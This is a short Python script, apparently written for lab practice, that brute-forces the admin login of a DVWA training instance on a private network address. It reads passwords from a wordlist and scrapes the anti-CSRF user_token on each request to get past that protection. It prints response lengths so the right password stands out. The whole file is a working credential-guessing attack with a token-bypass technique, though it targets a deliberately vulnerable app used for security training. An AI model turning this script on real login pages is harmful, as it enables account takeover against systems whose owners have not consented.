# coding=utf-8

import requests
import re

# define the url and header
url = 'http://192.168.11.128:8000/dvwa2/vulnerabilities/brute/'
header = {
    'Host': '192.168.11.128:8000',
    'Referer': 'http://192.168.11.128:8000/dvwa2/vulnerabilities/brute/',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.8',
    'Cookie': 'security=high; PHPSESSID=ad09ce7995991669728dd0ebb86c48e1'
}

# get the first user_token
r = requests.Session()
req = r.get(url, headers=header)
token = re.findall(r'user_token\'\svalue=\'(.*?)\'', req.content)[0]
# print(req.content)

# find the password from file
for line in open("d://rkolin.txt", 'r'):
    data = {
        'Login': 'Login',
        'username': 'admin',
        'password': line.strip(),
        'user_token': token
    }
    req1 = r.get(url, params=data, headers=header)
    token = re.findall(r'user_token\'\svalue=\'(.*?)\'', req1.content)[0]
    # print result
    lenth = len(req1.content)
    print("the page's lenth is: %d   the password is: %s" % (lenth,line.strip()))


